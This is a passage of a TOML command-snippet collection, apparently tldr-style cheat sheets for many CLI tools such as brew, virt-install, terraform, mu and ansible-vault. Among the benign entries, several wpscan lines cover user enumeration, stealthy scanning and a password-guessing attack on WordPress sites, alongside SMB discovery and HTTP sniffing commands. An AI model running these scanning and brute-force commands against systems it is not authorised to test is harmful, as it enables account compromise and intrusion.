  output = ""

[[snippets]]
  description = "Start a GUI specifying the font and font size"
  command = "sudo tlmgr gui -font ""<helvetica 18>"""
  output = ""

[[snippets]]
  description = "Start a GUI setting a specific geometry"
  command = "sudo tlmgr gui -geometry <width>x<height>-<xpos>+<ypos>"
  output = ""

[[snippets]]
  description = "Start a GUI passing an arbitrary X resource string"
  command = "sudo tlmgr gui -xrm <xresource>"
  output = ""

[[snippets]]
  description = "List all outdated casks and formulae"
  command = "brew outdated"
  output = ""

[[snippets]]
  description = "List only outdated formulae"
  command = "brew outdated --formula"
  output = ""

[[snippets]]
  description = "List only outdated casks"
  command = "brew outdated --cask"
  output = ""

[[snippets]]
  description = "Extract pages from PDF file and make a separate PDF file for each page"
  command = "pdfseparate <path/to/source_filename.pdf> <path/to/destination_filename-%d.pdf>"
  output = ""

[[snippets]]
  description = "Specify the first/start page for extraction"
  command = "pdfseparate -f <3> <path/to/source_filename.pdf> <path/to/destination_filename-%d.pdf>"
  output = ""

[[snippets]]
  description = "Specify the last page for extraction"
  command = "pdfseparate -l <10> <path/to/source_filename.pdf> <path/to/destination_filename-%d.pdf>"
  output = ""

[[snippets]]
  description = "Create a virtual machine with 1 GB RAM and 12 GB storage and start a Debian installation"
  command = "virt-install --name <vm_name> --memory <1024> --disk path=<path/to/image.qcow2>,size=<12> --cdrom <path/to/debian.iso>"
  output = ""

[[snippets]]
  description = "Create a x86-64, KVM-accelerated, UEFI-based virtual machine with the Q35 chipset, 4 GiB RAM, 16 GiB RAW storage, and start a Fedora installation"
  command = "virt-install --name <vm_name> --arch <x86_64> --virt-type <kvm> --machine <q35> --boot <uefi> --memory <4096> --disk path=<path/to/image.raw>,size=<16> --cdrom <path/to/fedora.iso>"
  output = ""

[[snippets]]
  description = "Create a diskless live virtual machine without an emulated sound device or a USB controller. Don't start an installation and don't autoconnect to console but attach a cdrom to it (might be useful for when using a live CD like tails)"
  command = "virt-install --name <vm_name> --memory <512> --disk <none> --controller <type=usb,model=none> --sound <none> --autoconsole <none> --install <no_install=yes> --cdrom <path/to/tails.iso>"
  output = ""

[[snippets]]
  description = "Create a virtual machine with 16 GiB RAM, 250 GiB storage, 8 cores with hyperthreading, a specific CPU topology, and a CPU model that shares most features with the host CPU"
  command = "virt-install --name <vm_name> --cpu <host-model>,topology.sockets=<1>,topology.cores=<4>,topology.threads=<2> --memory <16384> --disk path=<path/to/image.qcow2>,size=<250> --cdrom <path/to/debian.iso>"
  output = ""

[[snippets]]
  description = "Create a virtual machine and kickstart an automated deployment based on Fedora 35 using only remote resources (no ISO required)"
  command = "virt-install --name <vm_name> --memory <2048> --disk path=<path/to/image.qcow2>,size=<20> --location=<https://download.fedoraproject.org/pub/fedora/linux/releases/35/Everything/x86_64/os/> --extra-args=<""inst.ks=https://path/to/valid/kickstart.org"">"
  output = ""

[[snippets]]
  description = "Scale up a PAM image by the specified decimal factor"
  command = "pamstretch-gen <N> <path/to/image.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Play an audio source exactly N times (N=0 means forever)"
  command = "mpg321 -l <N> <path/to/file_a|URL> <path/to/file_b|URL> <...>"
  output = ""

[[snippets]]
  description = "Play a directory recursively"
  command = "mpg321 -B <path/to/directory>"
  output = ""

[[snippets]]
  description = "Enable Basic Keys ( `*` or `/` - Increase or decrease volume, `n` - Skip song, `m` - Mute/unmute.) while playing"
  command = "mpg321 -K <path/to/file_a|URL> <path/to/file_b|URL> <...>"
  output = ""

[[snippets]]
  description = "Play files randomly until interrupted"
  command = "mpg321 -Z <path/to/file_a|URL> <path/to/file_b|URL> <...>"
  output = ""

[[snippets]]
  description = "Shuffle the files before playing them once"
  command = "mpg321 -z <path/to/file_a|URL> <path/to/file_b|URL> <...>"
  output = ""

[[snippets]]
  description = "Play all files in the current directory and subdirectories, randomly (until interrupted), with Basic Keys enabled"
  command = "mpg321 -B -Z -K ."
  output = ""

[[snippets]]
  description = "Display [h]elp"
  command = "wondershaper -h"
  output = ""

[[snippets]]
  description = "Show the current [s]tatus of a specific [a]dapter"
  command = "wondershaper -s -a <adapter_name>"
  output = ""

[[snippets]]
  description = "Clear limits from a specific [a]dapter"
  command = "wondershaper -c -a <adapter_name>"
  output = ""

[[snippets]]
  description = "Set a specific maximum [d]ownload rate (in Kbps)"
  command = "wondershaper -a <adapter_name> -d <1024>"
  output = ""

[[snippets]]
  description = "Set a specific maximum [u]pload rate (in Kbps)"
  command = "wondershaper -a <adapter_name> -u <512>"
  output = ""

[[snippets]]
  description = "Set a specific maximum [d]ownload rate and [u]pload rate (in Kpbs)"
  command = "wondershaper -a <adapter_name> -d <1024> -u <512>"
  output = ""

[[snippets]]
  description = "Update the vulnerability database"
  command = "wpscan --update"
  output = ""

[[snippets]]
  description = "Scan a WordPress website"
  command = "wpscan --url <url>"
  output = ""

[[snippets]]
  description = "Scan a WordPress website, using random user agents and passive detection"
  command = "wpscan --url <url> --stealthy"
  output = ""

[[snippets]]
  description = "Scan a WordPress website, checking for vulnerable plugins and specifying the path to the `wp-content` directory"
  command = "wpscan --url <url> --enumerate <vp> --wp-content-dir <remote/path/to/wp-content>"
  output = ""

[[snippets]]
  description = "Scan a WordPress website through a proxy"
  command = "wpscan --url <url> --proxy <protocol://ip:port> --proxy-auth <username:password>"
  output = ""

[[snippets]]
  description = "Perform user identifiers enumeration on a WordPress website"
  command = "wpscan --url <url> --enumerate <u>"
  output = ""

[[snippets]]
  description = "Execute a password guessing attack on a WordPress website"
  command = "wpscan --url <url> --usernames <username|path/to/usernames.txt> --passwords <path/to/passwords.txt> threads <20>"
  output = ""

[[snippets]]
  description = "Scan a WordPress website, collecting vulnerability data from the WPVulnDB (<https://wpvulndb.com/>)"
  command = "wpscan --url <url> --api-token <token>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "openscad <path/to/button.scad>"
  output = ""

[[snippets]]
  description = "Convert a file to STL"
  command = "openscad -o <path/to/button.stl> <path/to/button.scad>"
  output = ""

[[snippets]]
  description = "Render a file to PNG in a specific colorscheme"
  command = "openscad -o <path/to/button.png> --colorscheme <Sunset> <path/to/button.scad>"
  output = ""

[[snippets]]
  description = "Browse for SSH servers"
  command = "bssh"
  output = ""

[[snippets]]
  description = "Browse for VNC servers"
  command = "bssh --vnc"
  output = ""

[[snippets]]
  description = "Browse for both SSH and VNC servers"
  command = "bssh --shell"
  output = ""

[[snippets]]
  description = "Browse for SSH servers in a specified domain"
  command = "bssh --domain=<domain>"
  output = ""

[[snippets]]
  description = "Add an item to DID section"
  command = "laydown did <item>"
  output = ""

[[snippets]]
  description = "Add an item to DOING section"
  command = "laydown doing <item>"
  output = ""

[[snippets]]
  description = "Clear all items"
  command = "laydown clear"
  output = ""

[[snippets]]
  description = "Use an editor to edit current data"
  command = "laydown edit"
  output = ""

[[snippets]]
  description = "Archive and clear current data"
  command = "laydown archive"
  output = ""

[[snippets]]
  description = "List tables in the current project"
  command = "cbt ls"
  output = ""

[[snippets]]
  description = "Print count of rows in a specific table in the current project"
  command = "cbt count ""<table_name>"""
  output = ""

[[snippets]]
  description = "Display a single row from a specific table with only 1 (most recent) cell revision per column in the current project"
  command = "cbt lookup ""<table_name>"" ""<row_key>"" cells-per-column=<1>"
  output = ""

[[snippets]]
  description = "Display a single row with only specific column(s) (omit qualifier to return entire family) in the current project"
  command = "cbt lookup ""<table_name>"" ""<row_key>"" columns=""<family1:qualifier1,family2:qualifier2,...>"""
  output = ""

[[snippets]]
  description = "Search up to 5 rows in the current project by a specific regex pattern and print them"
  command = "cbt read ""<table_name>"" regex=""<row_key_pattern>"" count=<5>"
  output = ""

[[snippets]]
  description = "Read a specific range of rows and print only returned row keys in the current project"
  command = "cbt read <table_name> start=<start_row_key> end=<end_row_key> keys-only=true"
  output = ""

[[snippets]]
  description = "Concatenate Bitcode files"
  command = "llvm-cat <path/to/file1.bc> <path/to/file2.bc> -o <path/to/out.bc>"
  output = ""

[[snippets]]
  description = "Initialize the email database, optionally specifying the Maildir directory and email addresses"
  command = "mu init --maildir=<path/to/directory> --my-address=<name@example.com>"
  output = ""

[[snippets]]
  description = "Index new emails"
  command = "mu index"
  output = ""

[[snippets]]
  description = "Find messages using a specific keyword (in message body, subject, sender, ...)"
  command = "mu find <keyword>"
  output = ""

[[snippets]]
  description = "Find messages to Alice with subject `jellyfish` containing the words `apples` or `oranges`"
  command = "mu find to:<alice> subject:<jellyfish> <apples> OR <oranges>"
  output = ""

[[snippets]]
  description = "Find unread messages about words starting with `soc` (the `*` only works at the end of the search term) in the Sent Items folder"
  command = "mu find 'subject:<soc>*' flag:<unread> maildir:'/<Sent Items>'"
  output = ""

[[snippets]]
  description = "Find messages from Sam with attached images, between 2 KiB and 2 MiB, written in 2021"
  command = "mu find 'mime:<image/*> size:<2k..2m> date:<20210101..20211231> from:<sam>"
  output = ""

[[snippets]]
  description = "List contacts with `Bob` in either name or email address"
  command = "mu cfind <Bob>"
  output = ""

[[snippets]]
  description = "Show all information"
  command = "rustup show"
  output = ""

[[snippets]]
  description = "Show the active toolchain"
  command = "rustup show active-toolchain"
  output = ""

[[snippets]]
  description = "Show the rustup data directory"
  command = "rustup show home"
  output = ""

[[snippets]]
  description = "Run maintenance on each of a list of repositories stored in the `maintenance.repo` user configuration variable"
  command = "git for-each-repo --config=<maintenance.repo> <maintenance run>"
  output = ""

[[snippets]]
  description = "Run `git pull` on each repository listed in a global configuration variable"
  command = "git for-each-repo --config=<global_configuration_variable> <pull>"
  output = ""

[[snippets]]
  description = "List all peers"
  command = "peerindex <master6.mrt>"
  output = ""

[[snippets]]
  description = "Display all peers that have provided routing information"
  command = "peerindex -r <master6.mrt>"
  output = ""

[[snippets]]
  description = "Recursively archive all files in the current directory into a .jar file"
  command = "jar cf <file.jar> *"
  output = ""

[[snippets]]
  description = "Unzip .jar/.war file to the current directory"
  command = "jar -xvf <file.jar>"
  output = ""

[[snippets]]
  description = "List a .jar/.war file content"
  command = "jar tf <path/to/file.jar>"
  output = ""

[[snippets]]
  description = "List a .jar/.war file content with verbose output"
  command = "jar tvf <path/to/file.jar>"
  output = ""

[[snippets]]
  description = "Format the configuration in the current directory"
  command = "terraform fmt"
  output = ""

[[snippets]]
  description = "Format the configuration in the current directory and subdirectories"
  command = "terraform fmt -recursive"
  output = ""

[[snippets]]
  description = "Display diffs of formatting changes"
  command = "terraform fmt -diff"
  output = ""

[[snippets]]
  description = "Do not list files that were formatted to `stdout`"
  command = "terraform fmt -list=false"
  output = ""

[[snippets]]
  description = "Use a specific version of Node.js in the current PowerShell session"
  command = "Set-NodeVersion <node_version>"
  output = ""

[[snippets]]
  description = "Use the latest installed Node.js version 20.x"
  command = "Set-NodeVersion ^20"
  output = ""

[[snippets]]
  description = "Set the default Node.js version for the current user (only applies to future PowerShell sessions)"
  command = "Set-NodeVersion <node_version> -Persist User"
  output = ""

[[snippets]]
  description = "Set the default Node.js version for all users (must be run as Administrator/root and only applies to future PowerShell sessions)"
  command = "Set-NodeVersion <node_version> -Persist Machine"
  output = ""

[[snippets]]
  description = "Decompile a Dex file into a directory"
  command = "jadx <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompile a Dex file into a specific directory"
  command = "jadx --output-dir <path/to/directory> <path/to/file>"
  output = ""

[[snippets]]
  description = "Initialize a new local repository"
  command = "dvc init"
  output = ""

[[snippets]]
  description = "Initialize DVC without Git"
  command = "dvc init --no-scm"
  output = ""

[[snippets]]
  description = "Initialize DVC in a subdirectory"
  command = "cd <path/to/subdir> && dvc init --sudir"
  output = ""

[[snippets]]
  description = "List all virtual private servers, or instances"
  command = "aws lightsail get-instances"
  output = ""

[[snippets]]
  description = "List all bundles (instance plans)"
  command = "aws lightsail list-bundles"
  output = ""

[[snippets]]
  description = "List all available instance images, or blueprints"
  command = "aws lightsail list-blueprints"
  output = ""

[[snippets]]
  description = "Create an instance"
  command = "aws lightsail create-instances --instance-names <name> --availability-zone <region> --bundle-id <nano_2_0> --blueprint-id <blueprint_id>"
  output = ""

[[snippets]]
  description = "Print the state of a specific instance"
  command = "aws lightsail get-instance-state --instance-name <name>"
  output = ""

[[snippets]]
  description = "Stop a specific instance"
  command = "aws lightsail stop-instance --instance-name <name>"
  output = ""

[[snippets]]
  description = "Delete a specific instance"
  command = "aws lightsail delete-instance --instance-name <name>"
  output = ""

[[snippets]]
  description = "Start a headless `transmission` session"
  command = "transmission-daemon"
  output = ""

[[snippets]]
  description = "Start and watch a specific directory for new torrents"
  command = "transmission-daemon --watch-dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Dump daemon settings in JSON format"
  command = "transmission-daemon --dump-settings > <path/to/file.json>"
  output = ""

[[snippets]]
  description = "Start with specific settings for the web interface"
  command = "transmission-daemon --auth --username <username> --password <password> --port <9091> --allowed <127.0.0.1>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "openssl help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "openssl help <x509>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "openssl version"
  output = ""

[[snippets]]
  description = "Make a directed graph acyclic by reversing some edges"
  command = "acyclic <path/to/input.gv> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Print if a graph is acyclic, has a cycle, or is undirected, producing no output graph"
  command = "acyclic -v -n <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "acyclic -?"
  output = ""

[[snippets]]
  description = "Analyze one or more directories"
  command = "phpstan analyse <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Analyze a directory using a configuration file"
  command = "phpstan analyse <path/to/directory> --configuration <path/to/config>"
  output = ""

[[snippets]]
  description = "Analyze using a specific rule level (0-7, higher is stricter)"
  command = "phpstan analyse <path/to/directory> --level <level>"
  output = ""

[[snippets]]
  description = "Specify an autoload file to load before analyzing"
  command = "phpstan analyse <path/to/directory> --autoload-file <path/to/autoload_file>"
  output = ""

[[snippets]]
  description = "Specify a memory limit during analysis"
  command = "phpstan analyse <path/to/directory> --memory-limit <memory_limit>"
  output = ""

[[snippets]]
  description = "Display available options for analysis"
  command = "phpstan analyse --help"
  output = ""

[[snippets]]
  description = "Execute a particular file"
  command = "mix run <my_script.exs>"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "mix new <project_name>"
  output = ""

[[snippets]]
  description = "Compile project"
  command = "mix compile"
  output = ""

[[snippets]]
  description = "Run project tests"
  command = "mix test"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mix help"
  output = ""

[[snippets]]
  description = "Generate a simple full-stack project (monolithic or microservices)"
  command = "jhipster"
  output = ""

[[snippets]]
  description = "Generate a simple frontend project"
  command = "jhipster --skip-server"
  output = ""

[[snippets]]
  description = "Generate a simple backend project"
  command = "jhipster --skip-client"
  output = ""

[[snippets]]
  description = "Apply latest JHipster updates to the project"
  command = "jhipster upgrade"
  output = ""

[[snippets]]
  description = "Add a new entity to a generated project"
  command = "jhipster entity <entity_name>"
  output = ""

[[snippets]]
  description = "Import a JDL file to configure your application (see: <https://start.jhipster.tech/jdl-studio/>)"
  command = "jhipster import-jdl <first_file.jh second_file.jh ... n_file.jh>"
  output = ""

[[snippets]]
  description = "Generate a CI/CD pipeline for your application"
  command = "jhipster ci-cd"
  output = ""

[[snippets]]
  description = "Generate a Kubernetes configuration for your application"
  command = "jhipster kubernetes"
  output = ""

[[snippets]]
  description = "Upload a file/folder to Google Drive"
  command = "skicka upload <path/to/local> <path/to/remote>"
  output = ""

[[snippets]]
  description = "Download a file/folder from Google Drive"
  command = "skicka download <path/to/remote> <path/to/local>"
  output = ""

[[snippets]]
  description = "List files"
  command = "skicka ls <path/to/folder>"
  output = ""

[[snippets]]
  description = "Show amount of space used by children folders"
  command = "skicka du <path/to/parent/folder>"
  output = ""

[[snippets]]
  description = "Create a folder"
  command = "skicka mkdir <path/to/folder>"
  output = ""

[[snippets]]
  description = "Delete a file"
  command = "skicka rm <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a new Azure Pipeline (YAML based)"
  command = "az pipelines create --org <organization_url> --project <project_name> --name <pipeline_name> --description <description> --repository <repository_name> --branch <branch_name>"
  output = ""

[[snippets]]
  description = "Delete a specific pipeline"
  command = "az pipelines delete --org <organization_url> --project <project_name> --id <pipeline_id>"
  output = ""

[[snippets]]
  description = "List pipelines"
  command = "az pipelines list --org <organization_url> --project <project_name>"
  output = ""

[[snippets]]
  description = "Enqueue a specific pipeline to run"
  command = "az pipelines run --org <organization_url> --project <project_name> --name <pipeline_name>"
  output = ""

[[snippets]]
  description = "Get the details of a specific pipeline"
  command = "az pipelines show --org <organization_url> --project <project_name> --name <pipeline_name>"
  output = ""

[[snippets]]
  description = "Update a specific pipeline"
  command = "az pipelines update --org <organization_url> --project <project_name> --name <pipeline_name> --new-name <pipeline_new_name> --new-folder-path <user1/production_pipelines>"
  output = ""

[[snippets]]
  description = "List all agents in a pool"
  command = "az pipelines agent list --org <organization_url> --pool-id <agent_pool>"
  output = ""

[[snippets]]
  description = "List duplicate or similar files in specific directories"
  command = "czkawka-cli <dup|image> --directories <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Find duplicate files in specific directories and delete them (default: `NONE`)"
  command = "czkawka-cli dup --directories <path/to/directory1 path/to/directory2 ...> --delete-method <AEN|AEO|ON|OO|HARD|NONE>"
  output = ""

[[snippets]]
  description = "List all logs in the current project"
  command = "gcloud logging logs list"
  output = ""

[[snippets]]
  description = "List all logs for a specific log bucket and location"
  command = "gcloud logging logs list --bucket=<bucket_id> --location=<location>"
  output = ""

[[snippets]]
  description = "List all logs for a specific view in a log bucket"
  command = "gcloud logging logs list --bucket=<bucket_id> --location=<location> --view=<view_id>"
  output = ""

[[snippets]]
  description = "List logs with a filter expression"
  command = "gcloud logging logs list --filter=""<expression>"""
  output = ""

[[snippets]]
  description = "List a specified number of logs"
  command = "gcloud logging logs list --limit=<number>"
  output = ""

[[snippets]]
  description = "List logs sorted by a specific field in ascending or descending order (`~` for descending)"
  command = "gcloud logging logs list --sort-by=""<field_name>"""
  output = ""

[[snippets]]
  description = "List logs sorted by multiple fields"
  command = "gcloud logging logs list --sort-by=""<field1>,~<field2>"""
  output = ""

[[snippets]]
  description = "List logs with verbose output, showing additional details"
  command = "gcloud logging logs list --verbosity=debug"
  output = ""

[[snippets]]
  description = "Download a remote image from Sylabs Cloud"
  command = "singularity pull --name <image.sif> <library://godlovedc/funny/lolcow:latest>"
  output = ""

[[snippets]]
  description = "Rebuild a remote image using the latest Singularity image format"
  command = "singularity build <image.sif> <docker://godlovedc/lolcow>"
  output = ""

[[snippets]]
  description = "Start a container from an image and get a shell inside it"
  command = "singularity shell <image.sif>"
  output = ""

[[snippets]]
  description = "Start a container from an image and run a command"
  command = "singularity exec <image.sif> <command>"
  output = ""

[[snippets]]
  description = "Start a container from an image and execute the internal runscript"
  command = "singularity run <image.sif>"
  output = ""

[[snippets]]
  description = "Build a singularity image from a recipe file"
  command = "sudo singularity build <image.sif> <recipe>"
  output = ""

[[snippets]]
  description = "Start the command-line with a custom configuration file"
  command = "odpscmd --config=<odps_config.ini>"
  output = ""

[[snippets]]
  description = "Switch current project"
  command = "use <project_name>;"
  output = ""

[[snippets]]
  description = "Show tables in the current project"
  command = "show tables;"
  output = ""

[[snippets]]
  description = "Describe a table"
  command = "desc <table_name>;"
  output = ""

[[snippets]]
  description = "Show table partitions"
  command = "show partitions <table_name>;"
  output = ""

[[snippets]]
  description = "Describe a partition"
  command = "desc <table_name> partition (<partition_spec>);"
  output = ""

[[snippets]]
  description = "Create a new React Native project"
  command = "ignite new <project_name>"
  output = ""

[[snippets]]
  description = "Generate file from a plugin"
  command = "ignite generate <plugin_name> <path/to/file>"
  output = ""

[[snippets]]
  description = "Add an Ignite plugin to the project"
  command = "ignite add <plugin_name>"
  output = ""

[[snippets]]
  description = "Remove an Ignite plugin from the project"
  command = "ignite remove <plugin_name>"
  output = ""

[[snippets]]
  description = "Save output to a file"
  command = "httpry -o <path/to/file.log>"
  output = ""

[[snippets]]
  description = "Listen on a specific interface and save output to a binary pcap format file"
  command = "httpry <eth0> -b <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Filter output by a comma-separated list of HTTP verbs"
  command = "httpry -m <get|post|put|head|options|delete|trace|connect|patch>"
  output = ""

[[snippets]]
  description = "Read from an input capture file and filter by IP"
  command = "httpry -r <path/to/file.log> '<host 192.168.5.25>'"
  output = ""

[[snippets]]
  description = "Run as daemon process"
  command = "httpry -d -o <path/to/file.log>"
  output = ""

[[snippets]]
  description = "Display account info"
  command = "doctl account get"
  output = ""

[[snippets]]
  description = "Show the hourly API limit, progress towards it, and when the rate limit resets"
  command = "doctl account ratelimit"
  output = ""

[[snippets]]
  description = "Display help"
  command = "doctl account --help"
  output = ""

[[snippets]]
  description = "Join a protected wireless network"
  command = "wpa_supplicant -i <interface> -c <path/to/wpa_supplicant_conf.conf>"
  output = ""

[[snippets]]
  description = "Join a protected wireless network and run it in a daemon"
  command = "wpa_supplicant -B -i <interface> -c <path/to/wpa_supplicant_conf.conf>"
  output = ""

[[snippets]]
  description = "List available databases"
  command = "dict -D"
  output = ""

[[snippets]]
  description = "Get information about a database"
  command = "dict -i <database_name>"
  output = ""

[[snippets]]
  description = "Look up a word in a specific database"
  command = "dict -d <database_name> <word>"
  output = ""

[[snippets]]
  description = "Look up a word in all available databases"
  command = "dict <word>"
  output = ""

[[snippets]]
  description = "Show information about the DICT server"
  command = "dict -I"
  output = ""

[[snippets]]
  description = "Install packages based on `conanfile.txt`"
  command = "conan install <.>"
  output = ""

[[snippets]]
  description = "Install packages and create configuration files for a specific generator"
  command = "conan install -g <generator>"
  output = ""

[[snippets]]
  description = "Install packages, building from source"
  command = "conan install <.> --build"
  output = ""

[[snippets]]
  description = "Search for locally installed packages"
  command = "conan search <package>"
  output = ""

[[snippets]]
  description = "Search for remote packages"
  command = "conan search <package> -r <remote>"
  output = ""

[[snippets]]
  description = "List remotes"
  command = "conan remote list"
  output = ""

[[snippets]]
  description = "Initialize a project"
  command = "jigsaw init"
  output = ""

[[snippets]]
  description = "Initialize a project using a starter template"
  command = "jigsaw init <template_name>"
  output = ""

[[snippets]]
  description = "Build the site for development"
  command = "jigsaw build"
  output = ""

[[snippets]]
  description = "Preview the site from the "build_local" directory"
  command = "jigsaw serve"
  output = ""

[[snippets]]
  description = "Build the site for production"
  command = "jigsaw build production"
  output = ""

[[snippets]]
  description = "Preview the site from the "build_production" directory"
  command = "jigsaw serve <build_production>"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records)"
  command = "drill <example.com>"
  output = ""

[[snippets]]
  description = "Lookup the mail server(s) associated with a given domain name (MX record)"
  command = "drill mx <example.com>"
  output = ""

[[snippets]]
  description = "Get all types of records for a given domain name"
  command = "drill any <example.com>"
  output = ""

[[snippets]]
  description = "Specify an alternate DNS server to query"
  command = "drill <example.com> @<8.8.8.8>"
  output = ""

[[snippets]]
  description = "Perform a reverse DNS lookup on an IP address (PTR record)"
  command = "drill -x <8.8.8.8>"
  output = ""

[[snippets]]
  description = "Perform DNSSEC trace from root servers down to a domain name"
  command = "drill -TD <example.com>"
  output = ""

[[snippets]]
  description = "Show DNSKEY record(s) for a domain name"
  command = "drill -s dnskey <example.com>"
  output = ""

[[snippets]]
  description = "Perform the default task in the `build.xml` file"
  command = "phing"
  output = ""

[[snippets]]
  description = "Initialize a new build file"
  command = "phing -i <path/to/build.xml>"
  output = ""

[[snippets]]
  description = "Perform a specific task"
  command = "phing <task_name>"
  output = ""

[[snippets]]
  description = "Use the given build file path"
  command = "phing -f <path/to/build.xml> <task_name>"
  output = ""

[[snippets]]
  description = "Log to the given file"
  command = "phing -logfile <path/to/log_file> <task_name>"
  output = ""

[[snippets]]
  description = "Use custom properties in the build"
  command = "phing -D<property>=<value> <task_name>"
  output = ""

[[snippets]]
  description = "Specify a custom listener class"
  command = "phing -listener <class_name> <task_name>"
  output = ""

[[snippets]]
  description = "Build using verbose output"
  command = "phing -verbose <task_name>"
  output = ""

[[snippets]]
  description = "Build a project with default build file `build.xml`"
  command = "ant"
  output = ""

[[snippets]]
  description = "Build a project using build [f]ile other than `build.xml`"
  command = "ant -f <buildfile.xml>"
  output = ""

[[snippets]]
  description = "Print information on possible targets for this project"
  command = "ant -p"
  output = ""

[[snippets]]
  description = "Print debugging information"
  command = "ant -d"
  output = ""

[[snippets]]
  description = "Execute all targets that do not depend on fail target(s)"
  command = "ant -k"
  output = ""

[[snippets]]
  description = "Find hosts in the local network with SMB shares"
  command = "nmblookup -S '*'"
  output = ""

[[snippets]]
  description = "Find hosts in the local network with SMB shares run by SAMBA"
  command = "nmblookup --status __SAMBA__"
  output = ""

[[snippets]]
  description = "Send coverage information to Coveralls"
  command = "php-coveralls"
  output = ""

[[snippets]]
  description = "Send coverage information to Coveralls for a specific directory"
  command = "php-coveralls --root_dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Send coverage information to Coveralls with a specific config"
  command = "php-coveralls --config <path/to/.coveralls.yml>"
  output = ""

[[snippets]]
  description = "Send coverage information to Coveralls with verbose output"
  command = "php-coveralls --verbose"
  output = ""

[[snippets]]
  description = "Send coverage information to Coveralls excluding source files with no executable statements"
  command = "php-coveralls --exclude-no-stmt"
  output = ""

[[snippets]]
  description = "Send coverage information to Coveralls with a specific environment name"
  command = "php-coveralls --env <test|dev|prod>"
  output = ""

[[snippets]]
  description = "Specify multiple Coverage Clover XML files to upload"
  command = "php-coveralls --coverage_clover <path/to/first_clover.xml> --coverage_clover <path/to/second_clover.xml>"
  output = ""

[[snippets]]
  description = "Output the JSON that will be sent to Coveralls to a specific file"
  command = "php-coveralls --json_path <path/to/coveralls-upload.json>"
  output = ""

[[snippets]]
  description = "Convert the specified Lisp Machine bitmap file into a PGM image"
  command = "lispmtopgm <path/to/input.lispm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "List files contained in an APK archive"
  command = "aapt list <path/to/app.apk>"
  output = ""

[[snippets]]
  description = "Display an app's metadata (version, permissions, etc.)"
  command = "aapt dump badging <path/to/app.apk>"
  output = ""

[[snippets]]
  description = "Create a new APK archive with files from the specified directory"
  command = "aapt package -F <path/to/app.apk> <path/to/directory>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr kcat"
  output = ""

[[snippets]]
  description = "Increase the contrast of a PNM image using histogram equalization"
  command = "pnmhisteq <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Only modify grey pixels"
  command = "pnmhisteq -grey <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Do not include black or white pixels in the histogram equalization"
  command = "pnmhisteq -no<black|white> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Execute a bitcode or IR file"
  command = "lli <path/to/file.ll>"
  output = ""

[[snippets]]
  description = "Execute with command-line arguments"
  command = "lli <path/to/file.ll> <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Enable all optimizations"
  command = "lli -O3 <path/to/file.ll>"
  output = ""

[[snippets]]
  description = "Load a dynamic library before linking"
  command = "lli --dlopen=<path/to/library.dll> <path/to/file.ll>"
  output = ""

[[snippets]]
  description = "Create the directory structure used by Zola at the given directory"
  command = "zola init <my_site>"
  output = ""

[[snippets]]
  description = "Build the whole site in the `public` directory after deleting it"
  command = "zola build"
  output = ""

[[snippets]]
  description = "Build the whole site into a different directory"
  command = "zola build --output-dir <path/to/output_directory/>"
  output = ""

[[snippets]]
  description = "Build and serve the site using a local server (default is `127.0.0.1:1111`)"
  command = "zola serve"
  output = ""

[[snippets]]
  description = "Build all pages just like the build command would, but without writing any of the results to disk"
  command = "zola check"
  output = ""

[[snippets]]
  description = "List all profiles"
  command = "nyxt --list-data-profiles"
  output = ""

[[snippets]]
  description = "Set the `init.lisp` file path"
  command = "nyxt --init <path/to/file>"
  output = ""

[[snippets]]
  description = "Change the path to the auto-config file"
  command = "nyxt --auto-config <path/to/file>"
  output = ""

[[snippets]]
  description = "Print system information"
  command = "nyxt --system-information"
  output = ""

[[snippets]]
  description = "Decompress a specific file"
  command = "ouch decompress <path/to/archive.tar.xz>"
  output = ""

[[snippets]]
  description = "Decompress a file to a specific location"
  command = "ouch decompress <path/to/archive.tar.xz> --dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Decompress multiple files"
  command = "ouch decompress <path/to/archive1.tar path/to/archive2.tar.gz ...>"
  output = ""

[[snippets]]
  description = "Compress files"
  command = "ouch compress <path/to/file1 path/to/file2 ...> <path/to/archive.zip>"
  output = ""

[[snippets]]
  description = "Create a new encrypted vault file with a prompt for a password"
  command = "ansible-vault create <vault_file>"
  output = ""

[[snippets]]
  description = "Create a new encrypted vault file using a vault key file to encrypt it"
  command = "ansible-vault create --vault-password-file=<password_file> <vault_file>"
  output = ""

[[snippets]]
  description = "Encrypt an existing file using an optional password file"
  command = "ansible-vault encrypt --vault-password-file=<password_file> <vault_file>"
  output = ""

[[snippets]]
  description = "Encrypt a string using Ansible's encrypted string format, displaying interactive prompts"
  command = "ansible-vault encrypt_string"
  output = ""

[[snippets]]
  description = "View an encrypted file, using a password file to decrypt"
  command = "ansible-vault view --vault-password-file=<password_file> <vault_file>"
  output = ""

[[snippets]]
  description = "Re-key already encrypted vault file with a new password file"
  command = "ansible-vault rekey --vault-password-file=<old_password_file> --new-vault-password-file=<new_password_file> <vault_file>"
  output = ""

[[snippets]]
  description = "Start MySQL Shell in interactive mode"
  command = "mysqlsh"
  output = ""

[[snippets]]
  description = "Connect to a MySQL server"
  command = "mysqlsh --user <username> --host <hostname> --port <port>"
  output = ""

[[snippets]]
  description = "Execute a SQL statement on the server and exit"
